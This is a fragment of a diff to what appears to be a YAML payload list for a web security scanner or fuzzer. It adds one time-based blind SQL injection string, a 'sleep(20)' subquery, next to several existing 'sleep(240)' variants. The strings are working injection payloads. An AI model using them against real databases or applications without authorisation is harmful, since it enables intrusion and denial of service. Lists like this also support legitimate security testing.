@@ -61,6 +61,8 @@ payloads:
   - >-
     ,(select*from(select(sleep(240)))a)
   - >-
+    ', (select*from(select(sleep(20)))a)) #',
+  - >-
     '(select*from(select(sleep(240)))a)-- V
   - >-
     '(select*from(select(sleep(240)))a)'
